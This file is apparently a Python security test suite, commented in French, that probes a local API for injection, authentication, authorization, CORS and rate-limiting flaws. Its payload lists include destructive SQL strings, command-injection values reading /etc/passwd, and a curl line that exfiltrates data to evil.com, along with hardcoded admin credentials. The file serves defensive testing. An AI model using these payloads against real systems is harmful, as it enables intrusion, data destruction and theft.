"""
🧪 Security Test Suite
Suite complète de tests de sécurité automatisés

Créé : 20 janvier 2026
Objectif : Jalon 3.3 - Tests Sécurité Automatisés
"""

import pytest
import asyncio
import aiohttp
import subprocess
import json
import time
from typing import List, Dict, Any
from urllib.parse import quote

# Configuration
BASE_URL = "http://localhost:8000"
ADMIN_CREDENTIALS = {"username": "admin", "password": "admin123"}  # À adapter


class SecurityTestSuite:
    """Suite de tests de sécurité automatisés."""
    
    def __init__(self, base_url: str = BASE_URL):
        self.base_url = base_url
        self.session = None
        self.auth_token = None
        self.results = {
            "total_tests": 0,
            "passed": 0,
            "failed": 0,
            "vulnerabilities": []
        }
    
    async def setup(self):
        """Initialiser la session de test."""
        self.session = aiohttp.ClientSession()
        
        # Authentification admin
        async with self.session.post(
            f"{self.base_url}/auth/login",
            json=ADMIN_CREDENTIALS
        ) as resp:
            if resp.status == 200:
                data = await resp.json()
                self.auth_token = data.get("access_token")
    
    async def teardown(self):
        """Nettoyer après les tests."""
        if self.session:
            await self.session.close()
    
    async def run_all_tests(self) -> Dict[str, Any]:
        """Exécuter tous les tests de sécurité."""
        print("🧪 DÉMARRAGE SUITE DE TESTS SÉCURITÉ")
        print("=" * 60)
        
        await self.setup()
        
        # Tests d'injection
        await self.test_sql_injection()
        await self.test_nosql_injection()
        await self.test_xss_injection()
        await self.test_command_injection()
        
        # Tests d'authentification
        await self.test_weak_passwords()
        await self.test_session_hijacking()
        await self.test_jwt_security()
        
        # Tests d'autorisation
        await self.test_rbac_bypass()
        await self.test_privilege_escalation()
        
        # Tests de configuration
        await self.test_security_headers()
        await self.test_cors_policy()
        await self.test_error_disclosure()
        
        # Tests de rate limiting
        await self.test_rate_limiting_bypass()
        await self.test_brute_force_protection()
        
        await self.teardown()
        
        # Générer le rapport
        return self.generate_report()
    
    async def test_sql_injection(self):
        """Tester les injections SQL."""
        print("\n💉 Test: Injection SQL")
        print("-" * 30)
        
        # Payloads SQLi classiques
        sqli_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "1'; DELETE FROM users; --",
            "' OR 1=1 #",
            "admin'--",
            "' OR 'x'='x",
            "'; EXEC xp_cmdshell('dir'); --"
        ]
        
        vulnerable_endpoints = [
            "/api/v1/vectors/search",
            "/api/v1/veritas/verify",
            "/api/v1/health"
        ]
        
        for payload in sqli_payloads:
            for endpoint in vulnerable_endpoints:
                self.results["total_tests"] += 1
                
                # Test via paramètre GET
                url = f"{self.base_url}{endpoint}?q={quote(payload)}"
                async with self.session.get(url) as resp:
                    if resp.status == 500:
                        # Erreur SQL possible
                        text = await resp.text()
                        if "sql" in text.lower() or "syntax" in text.lower():
                            self.results["failed"] += 1
                            self.results["vulnerabilities"].append({
                                "type": "SQL Injection",
                                "endpoint": endpoint,
                                "payload": payload,
                                "severity": "HIGH"
                            })
                            print(f"  ❌ SQLi détecté: {endpoint}")
                        else:
                            self.results["passed"] += 1
                    else:
                        self.results["passed"] += 1
                
                # Test via body POST
                if endpoint in ["/api/v1/veritas/verify", "/api/v1/vectors/search"]:
                    data = {"query": payload}
                    async with self.session.post(
                        f"{self.base_url}{endpoint}",
                        json=data
                    ) as resp:
                        if resp.status == 500:
                            self.results["failed"] += 1
                            self.results["vulnerabilities"].append({
                                "type": "SQL Injection (POST)",
                                "endpoint": endpoint,
                                "payload": payload,
                                "severity": "HIGH"
                            })
                            print(f"  ❌ SQLi POST détecté: {endpoint}")
                        else:
                            self.results["passed"] += 1
    
    async def test_nosql_injection(self):
        """Tester les injections NoSQL."""
        print("\n🍃 Test: Injection NoSQL")
        print("-" * 30)
        
        # Payloads NoSQL
        nosql_payloads = [
            {"$ne": ""},
            {"$gt": ""},
            {"$regex": ".*"},
            {"$where": "return true"},
            {"$or": [{"1": "1"}, {"1": "2"}]}
        ]
        
        for payload in nosql_payloads:
            self.results["total_tests"] += 1
            
            async with self.session.post(
                f"{self.base_url}/api/v1/vectors/search",
                json=payload
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    # Vérifier si tous les résultats sont retournés
                    if isinstance(data, dict) and "results" in data:
                        if len(data["results"]) > 100:  # Suspicion
                            self.results["failed"] += 1
                            self.results["vulnerabilities"].append({
                                "type": "NoSQL Injection",
                                "payload": payload,
                                "severity": "HIGH"
                            })
                            print(f"  ❌ NoSQLi possible")
                        else:
                            self.results["passed"] += 1
                else:
                    self.results["passed"] += 1
    
    async def test_xss_injection(self):
        """Tester les injections XSS."""
        print("\n🎭 Test: Injection XSS")
        print("-" * 30)
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "';alert('XSS');//",
            "<svg onload=alert('XSS')>",
            "'\"><script>alert('XSS')</script>"
        ]
        
        for payload in xss_payloads:
            self.results["total_tests"] += 1
            
            # Test dans les paramètres
            async with self.session.get(
                f"{self.base_url}/api/v1/health?search={quote(payload)}"
            ) as resp:
                text = await resp.text()
                if payload in text and resp.status == 200:
                    self.results["failed"] += 1
                    self.results["vulnerabilities"].append({
                        "type": "XSS",
                        "payload": payload,
                        "severity": "MEDIUM"
                    })
                    print(f"  ❌ XSS non échappé")
                else:
                    self.results["passed"] += 1
    
    async def test_command_injection(self):
        """Tester les injections de commande."""
        print("\n⚡ Test: Injection de Commande")
        print("-" * 30)
        
        cmd_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& whoami",
            "`id`",
            "$(id)",
            "; curl http://evil.com/steal?data=$(whoami)"
        ]
        
        for payload in cmd_payloads:
            self.results["total_tests"] += 1
            
            # Test avec le calculateur VERITAS
            async with self.session.post(
                f"{self.base_url}/api/v1/veritas/calculate",
                json={"expression": f"2+2{payload}"}
            ) as resp:
                if resp.status == 500:
                    text = await resp.text()
                    if "uid=" in text or "root" in text:
                        self.results["failed"] += 1
                        self.results["vulnerabilities"].append({
                            "type": "Command Injection",
                            "payload": payload,
                            "severity": "CRITICAL"
                        })
                        print(f"  ❌ Command injection détectée")
                    else:
                        self.results["passed"] += 1
                else:
                    self.results["passed"] += 1
    
    async def test_weak_passwords(self):
        """Tester les mots de passe faibles."""
        print("\n🔑 Test: Mots de Passe Faibles")
        print("-" * 30)
        
        weak_passwords = [
            "password", "123456", "admin", "root", "qwerty",
            "password123", "admin123", "letmein", "welcome"
        ]
        
        for password in weak_passwords:
            self.results["total_tests"] += 1
            
            async with self.session.post(
                f"{self.base_url}/auth/login",
                json={"username": "admin", "password": password}
            ) as resp:
                if resp.status == 200:
                    self.results["failed"] += 1
                    self.results["vulnerabilities"].append({
                        "type": "Weak Password",
                        "password": password,
                        "severity": "HIGH"
                    })
                    print(f"  ❌ Mot de passe faible: {password}")
                else:
                    self.results["passed"] += 1
    
    async def test_jwt_security(self):
        """Tester la sécurité des JWT."""
        print("\n🎫 Test: Sécurité JWT")
        print("-" * 30)
        
        if not self.auth_token:
            print("  ⚠️  Pas de token disponible")
            return
        
        # Test JWT none algorithm
        malformed_token = self.auth_token[:-10] + "A" * 10
        
        self.results["total_tests"] += 1
        
        headers = {"Authorization": f"Bearer {malformed_token}"}
        async with self.session.get(
            f"{self.base_url}/api/v1/users/profile",
            headers=headers
        ) as resp:
            if resp.status == 200:
                self.results["failed"] += 1
                self.results["vulnerabilities"].append({
                    "type": "JWT Weakness",
                    "issue": "None algorithm accepted",
                    "severity": "HIGH"
                })
                print(f"  ❌ JWT vulnérable")
            else:
                self.results["passed"] += 1
        
        # Test token expiration
        self.results["total_tests"] += 1
        
        expired_token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MTYwMDAwMDAwMH0.invalid"
        
        headers = {"Authorization": f"Bearer {expired_token}"}
        async with self.session.get(
            f"{self.base_url}/api/v1/users/profile",
            headers=headers
        ) as resp:
            if resp.status == 200:
                self.results["failed"] += 1
                self.results["vulnerabilities"].append({
                    "type": "JWT Expiration",
                    "issue": "Expired token accepted",
                    "severity": "MEDIUM"
                })
                print(f"  ❌ Token expiré accepté")
            else:
                self.results["passed"] += 1
    
    async def test_rbac_bypass(self):
        """Tester le contournement RBAC."""
        print("\n👥 Test: Contournement RBAC")
        print("-" * 30)
        
        # Créer un utilisateur normal
        user_data = {
            "username": "testuser",
            "email": "test@example.com",
            "password": "TestPass123!",
            "role": "user"
        }
        
        async with self.session.post(
            f"{self.base_url}/auth/register",
            json=user_data
        ) as resp:
            if resp.status == 201:
                # Login avec utilisateur normal
                async with self.session.post(
                    f"{self.base_url}/auth/login",
                    json={"username": "testuser", "password": "TestPass123!"}
                ) as resp2:
                    if resp2.status == 200:
                        data = await resp2.json()
                        user_token = data.get("access_token")
                        
                        # Tenter d'accéder aux endpoints admin
                        admin_endpoints = [
                            "/api/v1/admin/users",
                            "/api/v1/admin/settings",
                            "/api/v1/security/stats"
                        ]
                        
                        for endpoint in admin_endpoints:
                            self.results["total_tests"] += 1
                            
                            headers = {"Authorization": f"Bearer {user_token}"}
                            async with self.session.get(
                                f"{self.base_url}{endpoint}",
                                headers=headers
                            ) as resp3:
                                if resp3.status == 200:
                                    self.results["failed"] += 1
                                    self.results["vulnerabilities"].append({
                                        "type": "RBAC Bypass",
                                        "endpoint": endpoint,
                                        "severity": "HIGH"
                                    })
                                    print(f"  ❌ RBAC contourné: {endpoint}")
                                else:
                                    self.results["passed"] += 1
    
    async def test_security_headers(self):
        """Tester les headers de sécurité."""
        print("\n🛡️  Test: Headers de Sécurité")
        print("-" * 30)
        
        required_headers = [
            "X-Content-Type-Options",
            "X-Frame-Options",
            "X-XSS-Protection",
            "Strict-Transport-Security",
            "Content-Security-Policy"
        ]
        
        async with self.session.get(f"{self.base_url}/") as resp:
            headers = resp.headers
            
            for header in required_headers:
                self.results["total_tests"] += 1
                
                if header not in headers:
                    self.results["failed"] += 1
                    self.results["vulnerabilities"].append({
                        "type": "Missing Security Header",
                        "header": header,
                        "severity": "MEDIUM"
                    })
                    print(f"  ❌ Header manquant: {header}")
                else:
                    self.results["passed"] += 1
    
    async def test_cors_policy(self):
        """Tester la politique CORS."""
        print("\n🌐 Test: Politique CORS")
        print("-" * 30)
        
        # Test origine non autorisée
        self.results["total_tests"] += 1
        
        headers = {"Origin": "https://evil.com"}
        async with self.session.get(
            f"{self.base_url}/api/v1/health",
            headers=headers
        ) as resp:
            cors_header = resp.headers.get("Access-Control-Allow-Origin")
            if cors_header == "*" or cors_header == "https://evil.com":
                self.results["failed"] += 1
                self.results["vulnerabilities"].append({
                    "type": "CORS Misconfiguration",
                    "allowed_origin": cors_header,
                    "severity": "MEDIUM"
                })
                print(f"  ❌ CORS trop permissif: {cors_header}")
            else:
                self.results["passed"] += 1
    
    async def test_rate_limiting_bypass(self):
        """Tester le contournement du rate limiting."""
        print("\n⏱️  Test: Contournement Rate Limiting")
        print("-" * 30)
        
        # Tenter de bypass avec X-Forwarded-For
        self.results["total_tests"] += 1
        
        success_count = 0
        for i in range(20):  # Plus que la limite normale
            headers = {"X-Forwarded-For": f"192.168.1.{i}"}
            async with self.session.get(
                f"{self.base_url}/api/v1/health",
                headers=headers
            ) as resp:
                if resp.status == 200:
                    success_count += 1
        
        if success_count > 15:  # Si trop de succès
            self.results["failed"] += 1
            self.results["vulnerabilities"].append({
                "type": "Rate Limiting Bypass",
                "method": "X-Forwarded-For",
                "success_count": success_count,
                "severity": "MEDIUM"
            })
            print(f"  ❌ Rate limiting bypassé: {success_count} succès")
        else:
            self.results["passed"] += 1
    
    async def test_brute_force_protection(self):
        """Tester la protection brute force."""
        print("\n🔨 Test: Protection Brute Force")
        print("-" * 30)
        
        # Tentatives de login multiples
        blocked = False
        for i in range(15):
            async with self.session.post(
                f"{self.base_url}/auth/login",
                json={"username": "admin", "password": f"wrong{i}"}
            ) as resp:
                if resp.status == 429:
                    blocked = True
                    break
        
        self.results["total_tests"] += 1
        
        if not blocked:
            self.results["failed"] += 1
            self.results["vulnerabilities"].append({
                "type": "No Brute Force Protection",
                "attempts": 15,
                "severity": "HIGH"
            })
            print(f"  ❌ Pas de protection brute force")
        else:
            self.results["passed"] += 1
            print(f"  ✅ Brute force bloqué")
    
    def generate_report(self) -> Dict[str, Any]:
        """Générer le rapport de test."""
        report = {
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "summary": {
                "total_tests": self.results["total_tests"],
                "passed": self.results["passed"],
                "failed": self.results["failed"],
                "success_rate": round((self.results["passed"] / self.results["total_tests"]) * 100, 2)
            },
            "vulnerabilities": self.results["vulnerabilities"],
            "severity_breakdown": {
                "critical": len([v for v in self.results["vulnerabilities"] if v["severity"] == "CRITICAL"]),
                "high": len([v for v in self.results["vulnerabilities"] if v["severity"] == "HIGH"]),
                "medium": len([v for v in self.results["vulnerabilities"] if v["severity"] == "MEDIUM"]),
                "low": len([v for v in self.results["vulnerabilities"] if v["severity"] == "LOW"])
            }
        }
        
        return report


# Tests de dépendances
def test_dependencies():
    """Scanner les dépendances pour vulnérabilités."""
    print("\n📦 Test: Vulnérabilités Dépendances")
    print("-" * 40)
    
    # Utiliser safety pour scanner
    try:
        result = subprocess.run(
            ["safety", "check", "--json"],
            capture_output=True,
            text=True,
            cwd="d:/aindusdb_repo/aindusdb_core"
        )
        
        if result.returncode == 0:
            print("  ✅ Aucune vulnérabilité connue")
            return []
        else:
            vulnerabilities = json.loads(result.stdout)
            print(f"  ❌ {len(vulnerabilities)} vulnérabilités trouvées")
            return vulnerabilities
    except FileNotFoundError:
        print("  ⚠️  Safety non installé")
        return []


# Tests de charge avec profil attaquant
async def test_load_with_attacker_profile():
    """Test de charge simulant un attaquant."""
    print("\n💥 Test: Charge Profil Attaquant")
    print("-" * 35)
    
    # Créer multiple connections concurrentes
    tasks = []
    for i in range(100):
        task = asyncio.create_task(
            simulate_attacker_request(i)
        )
        tasks.append(task)
    
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    success_count = sum(1 for r in results if not isinstance(r, Exception))
    blocked_count = len(results) - success_count
    
    print(f"  ✅ Requêtes bloquées: {blocked_count}/100")
    print(f"  📊 Succès: {success_count}%")
    
    return {
        "total_requests": 100,
        "blocked": blocked_count,
        "success_rate": success_count
    }


async def simulate_attacker_request(request_id: int):
    """Simuler une requête d'attaquant."""
    async with aiohttp.ClientSession() as session:
        # Varier les techniques d'attaque
        if request_id % 3 == 0:
            # Injection SQL
            payload = "'; DROP TABLE users; --"
            url = f"{BASE_URL}/api/v1/health?q={payload}"
        elif request_id % 3 == 1:
            # Brute force
            payload = {"username": "admin", "password": f"guess{request_id}"}
            url = f"{BASE_URL}/auth/login"
            async with session.post(url, json=payload) as resp:
                return resp.status
        else:
            # Scan de port
            url = f"{BASE_URL}/api/v1/health"
        
        async with session.get(url) as resp:
            return resp.status


# Point d'entrée principal
async def main():
    """Exécuter tous les tests de sécurité."""
    # Test suite complète
    suite = SecurityTestSuite()
    report = await suite.run_all_tests()
    
    # Tests dépendances
    dep_vulns = test_dependencies()
    
    # Test charge
    load_results = await test_load_with_attacker_profile()
    
    # Rapport final
    print("\n" + "=" * 60)
    print("📊 RAPPORT FINAL DE SÉCURITÉ")
    print("=" * 60)
    print(f"Tests exécutés: {report['summary']['total_tests']}")
    print(f"Succès: {report['summary']['passed']}")
    print(f"Échecs: {report['summary']['failed']}")
    print(f"Taux de succès: {report['summary']['success_rate']}%")
    print(f"\nVulnérabilités trouvées: {len(report['vulnerabilities'])}")
    print(f"  - Critiques: {report['severity_breakdown']['critical']}")
    print(f"  - Élevées: {report['severity_breakdown']['high']}")
    print(f"  - Moyennes: {report['severity_breakdown']['medium']}")
    print(f"  - Faibles: {report['severity_breakdown']['low']}")
    
    # Sauvegarder le rapport
    with open("security_test_report.json", "w") as f:
        json.dump(report, f, indent=2)
    
    print(f"\n📄 Rapport sauvegardé: security_test_report.json")
    
    return report


if __name__ == "__main__":
    print("🚨 Lancement de la suite de tests de sécurité...")
    print("Assurez-vous que le serveur est démarré:")
    print("  uvicorn app.main:app --reload\n")
    
    asyncio.run(main())
